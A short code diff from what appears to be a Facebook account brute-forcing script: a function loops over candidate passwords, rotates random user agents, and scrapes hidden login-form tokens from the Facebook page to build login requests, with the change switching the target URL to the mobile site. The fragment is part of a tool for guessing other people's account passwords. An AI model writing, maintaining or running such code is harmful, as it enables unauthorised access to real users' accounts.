@@ -1140,7 +1140,7 @@ def m5(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    pro = random.choice(ugen)
-   free_fb = session.get(f'https://en-gb.facebook.com').text
+   free_fb = session.get(f'https://m.facebook.com').text
    log_data = {'m_ts':re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
 'li':re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
 'try_number': '0',
